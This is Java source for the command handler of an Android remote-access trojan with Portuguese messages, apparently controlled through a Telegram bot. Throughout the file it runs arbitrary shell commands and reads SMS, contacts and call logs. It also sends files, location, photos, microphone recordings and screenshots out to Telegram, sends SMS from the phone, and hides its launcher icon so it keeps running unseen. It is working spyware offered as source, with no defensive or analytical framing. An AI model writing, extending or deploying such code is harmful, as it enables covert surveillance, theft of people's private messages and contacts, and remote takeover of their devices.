package com.sec.app;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import org.json.JSONObject;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

public class CmdHandler {
    private static Context ctx;
    private static final String nl = "\n";

    public static void init(Context c) { ctx = c; }

    public static void exec(String raw) {
        new Thread(() -> {
            try {
                String cmd = raw.trim();

                if (cmd.startsWith("/shell ")) {
                    sh(cmd.substring(7));
                } else if (cmd.equals("/sysinfo")) {
                    sysinfo();
                } else if (cmd.startsWith("/files ")) {
                    listFiles(cmd.substring(7));
                } else if (cmd.startsWith("/download ")) {
                    sendFile(cmd.substring(10));
                } else if (cmd.equals("/sms")) {
                    readSms();
                } else if (cmd.equals("/contacts")) {
                    readContacts();
                } else if (cmd.equals("/calllogs")) {
                    readCalls();
                } else if (cmd.startsWith("/smsSend ")) {
                    smsSend(cmd.substring(9));
                } else if (cmd.startsWith("/loc")) {
                    ModMedia.loc();
                } else if (cmd.startsWith("/photo")) {
                    String[] p = cmd.split(" ");
                    boolean front = p.length > 1 && p[1].startsWith("f");
                    ModMedia.photo(front);
                } else if (cmd.startsWith("/mic ")) {
                    String[] p = cmd.split(" ");
                    int secs = 10;
                    try { secs = Integer.parseInt(p[1]); } catch (Exception ignored) {}
                    if (secs < 1) secs = 1;
                    if (secs > 300) secs = 300;
                    ModMedia.mic(secs);
                } else if (cmd.equals("/screenshot")) {
                    ModShot.capture();
                } else if (cmd.equals("/hide")) {
                    hideIcon(true);
                } else if (cmd.equals("/unhide")) {
                    hideIcon(false);
                } else if (cmd.equals("/vibrate")) {
                    vibrate();
                } else if (cmd.equals("/ping")) {
                    TgApi.send("pong");
                } else {
                    TgApi.send("❓ desconhecido. Comandos: /sysinfo /shell /files /download /sms /contacts /calllogs /smsSend /loc /photo [f] /mic <s> /screenshot /hide /unhide /ping /vibrate");
                }
            } catch (Exception e) {
                TgApi.send("⚠️ Erro: " + e);
            }
        }).start();
    }

    // ───────────── ocultação de ícone ─────────────
    // O app continua rodando (serviço foreground) — /unhide funciona via Telegram
    private static void hideIcon(boolean hide) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName launcher = new ComponentName(ctx, MainActivity.class);
            int state = hide
                ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            pm.setComponentEnabledSetting(launcher, state, PackageManager.DONT_KILL_APP);
            TgApi.send(hide ? "🙈 ícone ocultado (agente continua ativo)" : "👁 ícone restaurado");
        } catch (Exception e) {
            TgApi.send("hide/unhide erro: " + e);
        }
    }

    private static void smsSend(String arg) {
        String[] p = arg.split("\\|", 2);
        if (p.length < 2) { TgApi.send("uso: /smsSend <numero>|<mensagem>"); return; }
        if (!hasPerm(Manifest.permission.SEND_SMS)) { TgApi.send("sem permissão SEND_SMS"); return; }
        try {
            SmsManager sm = (Build.VERSION.SDK_INT >= 31)
                ? ctx.getSystemService(SmsManager.class)
                : SmsManager.getDefault();
            ArrayList<String> parts = sm.divideMessage(p[1]);
            sm.sendMultipartTextMessage(p[0], null, parts, null, null);
            TgApi.send("✉️ SMS enviado para " + p[0]);
        } catch (Exception e) { TgApi.send("smsSend erro: " + e); }
    }

    private static void sh(String c) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", c});
            String out = readStream(p.getInputStream()) + readStream(p.getErrorStream());
            TgApi.send("$ " + c + nl + (out.trim().isEmpty() ? "(sem saída)" : out));
        } catch (Exception e) { TgApi.send("shell erro: " + e); }
    }

    private static String readStream(InputStream i) throws IOException {
        BufferedReader r = new BufferedReader(new InputStreamReader(i, StandardCharsets.UTF_8));
        StringBuilder s = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) s.append(l).append(nl);
        r.close();
        return s.toString();
    }

    private static void sysinfo() {
        StringBuilder s = new StringBuilder();
        s.append("📱 ").append(Build.MODEL).append(nl);
        s.append("Android ").append(Build.VERSION.RELEASE).append(nl);
        s.append("Root: ").append(canSu() ? "Sim" : "Não").append(nl);
        s.append("Bateria: ").append(batteryPct()).append("%").append(nl);
        s.append("Ícone: ").append(iconHidden() ? "oculto" : "visível").append(nl);
        TgApi.send(s.toString());
    }

    private static boolean iconHidden() {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName launcher = new ComponentName(ctx, MainActivity.class);
            return pm.getComponentEnabledSetting(launcher)
                == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER;
        } catch (Exception e) { return false; }
    }

    private static boolean canSu() {
        try { Process p = Runtime.getRuntime().exec("su -c id");
            return p.waitFor() == 0; } catch (Exception e) { return false; }
    }

    private static String batteryPct() {
        try {
            Intent i = ctx.registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scl = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            return scl > 0 ? String.valueOf(lvl * 100 / scl) : "?";
        } catch (Exception e) { return "?"; }
    }

    private static void listFiles(String path) {
        File d = new File(path);
        if (!d.exists() || !d.isDirectory()) { TgApi.send("path inválido: " + path); return; }
        StringBuilder s = new StringBuilder("📁 " + path + nl);
        File[] fs = d.listFiles();
        if (fs != null) for (File f : fs)
            s.append(f.isDirectory() ? "[D] " : "[F] ").append(f.getName()).append(nl);
        TgApi.send(s.toString());
    }

    private static void sendFile(String path) {
        File f = new File(path);
        if (!f.exists() || !f.isFile()) { TgApi.send("arquivo não existe: " + path); return; }
        TgApi.sendFile(f, f.getName());
    }

    private static void readSms() {
        if (!hasPerm(Manifest.permission.READ_SMS)) { TgApi.send("sem permissão READ_SMS"); return; }
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 30");
        StringBuilder s = new StringBuilder();
        if (c != null) {
            while (c.moveToNext())
                s.append(c.getString(c.getColumnIndexOrThrow("address")))
                 .append(" | ").append(c.getString(c.getColumnIndexOrThrow("body"))).append(nl);
            c.close();
        }
        TgApi.send(s.length() > 0 ? s.toString() : "caixa vazia");
    }

    private static void readContacts() {
        if (!hasPerm(Manifest.permission.READ_CONTACTS)) { TgApi.send("sem permissão CONTACTS"); return; }
        Cursor c = ctx.getContentResolver().query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        StringBuilder s = new StringBuilder();
        if (c != null) {
            while (c.moveToNext())
                s.append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                 .append(" -> ")
                 .append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))).append(nl);
            c.close();
        }
        TgApi.send(s.length() > 0 ? s.toString() : "sem contatos");
    }

    private static void readCalls() {
        if (!hasPerm(Manifest.permission.READ_CALL_LOG)) { TgApi.send("sem permissão CALL_LOG"); return; }
        Cursor c = ctx.getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,
            null, null, null, "date DESC LIMIT 30");
        StringBuilder s = new StringBuilder();
        if (c != null) {
            while (c.moveToNext())
                s.append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)))
                 .append(" | tipo ").append(c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)))
                 .append(" | ").append(new java.util.Date(
                    c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)))).append(nl);
            c.close();
        }
        TgApi.send(s.length() > 0 ? s.toString() : "sem chamadas");
    }

    public static void handleUpload(JSONObject doc) {
        try {
            String fileId = doc.getString("file_id");
            String name = doc.optString("file_name", "upload_" + System.currentTimeMillis());
            String path = TgApi.downloadFileId(fileId);
            new File(path).renameTo(new File(__appDir(), name));
            TgApi.send("📥 salvo: " + name);
        } catch (Exception e) { TgApi.send("upload erro: " + e); }
    }

    private static void vibrate() {
        try {
            android.os.Vibrator v;
            if (Build.VERSION.SDK_INT >= 31)
                v = ctx.getSystemService(android.os.Vibrator.class);
            else
                v = (android.os.Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) v.vibrate(500);
        } catch (Exception ignored) {}
    }

    private static boolean hasPerm(String p) {
        return ctx.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED;
    }
}
